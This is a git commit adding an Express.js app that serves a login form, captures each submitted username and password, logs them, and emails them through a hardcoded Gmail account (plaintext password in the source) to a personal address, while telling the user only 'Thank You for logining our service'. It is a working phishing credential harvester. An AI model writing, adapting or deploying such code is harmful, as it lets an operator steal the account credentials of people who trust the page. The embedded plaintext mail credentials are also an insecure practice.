5b108271ffa62e2d1d886094fb514343a034faec
Davidagas <62882376+Davidagas@users.noreply.github.com>
2020-05-16 08:45:13 +0400

    Add files via upload

---
+++ app.js
@@ -0,0 +1,57 @@
+var express = require("express");
+var app = express();
+var bodyParser = require("body-parser");
+app.set("view engine","ejs");
+app.use(bodyParser.urlencoded({
+	extended : true
+}))
+// Starting to send gmail
+const nodemailer = require('nodemailer');
+
+//step 1
+let transporter = nodemailer.createTransport({
+	service : "gmail",
+	auth :{
+		user : 'technodevid123@gmail.com', //login
+		pass : 'drty12drty12' //password
+	}
+});
+
+var loginName;
+var password;
+app.post("/login",function(req,res) {
+	loginName = req.body.login;
+	password = req.body.password;
+	res.send("Thank You for logining our service");
+	console.log("login: " + loginName)
+	console.log("password: " + password)
+//step 2
+let mailOptions = {
+	from : 'technodevid123@gmail.com', // email
+	to : 'davidagasiev2005@gmail.com', // email
+	subject : "accaunt", //subject
+	text : "login: " + loginName + ", password : " + password //text 
+};
+	
+//step 3
+transporter.sendMail(mailOptions,function (err,data) {
+	if (err) {
+		console.log('ERROR: ' + err);
+	}else {
+		console.log('we made it mail was sent');
+	}
+}) 
+})
+
+
+
+app.get("/",function(req,res){
+	res.render("login");
+});
+
+app.listen(3000,function(){
+	console.log('started');
+});
+
+
+
